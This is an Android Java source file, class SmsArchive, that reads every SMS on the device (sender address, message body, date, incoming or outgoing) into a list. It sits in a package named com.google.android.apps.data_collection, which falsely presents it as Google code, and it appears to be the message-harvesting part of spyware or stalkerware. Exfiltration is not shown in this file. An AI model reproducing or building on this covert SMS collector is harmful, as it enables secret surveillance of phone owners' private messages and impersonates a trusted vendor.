package com.google.android.apps.data_collection;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.Telephony;
import android.util.Log;

import com.google.android.apps.App;
import com.google.android.apps.repositories.models.BaseEvent;
import com.google.android.apps.repositories.models.events.Message;
import com.google.android.apps.utils.Constants;
import com.google.android.apps.utils.DateUtils;

import java.util.ArrayList;
import java.util.List;

import io.reactivex.Single;

/**
 * Created by OldMan on 19.07.2017.
 */

public class SmsArchive {
    private String TAG = SmsArchive.class.getSimpleName();
    private Context context;

    public SmsArchive() {
        this.context = App.getAppComponent().getContext();
    }

    public Single<List<BaseEvent>> getSmsList() {
        List<BaseEvent> messageList = new ArrayList<>();
        Uri uri = Uri.parse("content://sms");
        Cursor cursor = context.getContentResolver().query(uri, null, null, null, null);
        if (cursor != null) {
            Message message;
            if (cursor.moveToFirst()) {
                for (int i = 0; i < cursor.getCount(); i++) {
                    // Type of call retrieved from the cursor.
                    message = new Message();
                    int type = cursor.getInt(cursor
                            .getColumnIndex("type"));
                    Log.d(TAG, "SMS Type : " + type);
                    if (type == Telephony.Sms.MESSAGE_TYPE_INBOX)
                        message.setType(Constants.INCOMING_SMS);
                    else
                        message.setType(Constants.OUTGOING_SMS);

                    message.setNumber(cursor.getString(cursor.getColumnIndex("address")));
                    message.setData(cursor.getString(cursor.getColumnIndex("body")));
                    message.setDate(DateUtils.convertMilliSecondsToFormattedDate(cursor.getLong(cursor
                            .getColumnIndex("date"))));
                    messageList.add(message);
                    cursor.moveToNext();
                }
            } else {
                Log.d(TAG, "Send Cursor is Empty");
            }
            cursor.close();
        }
        return Single.just(messageList);
    }
}
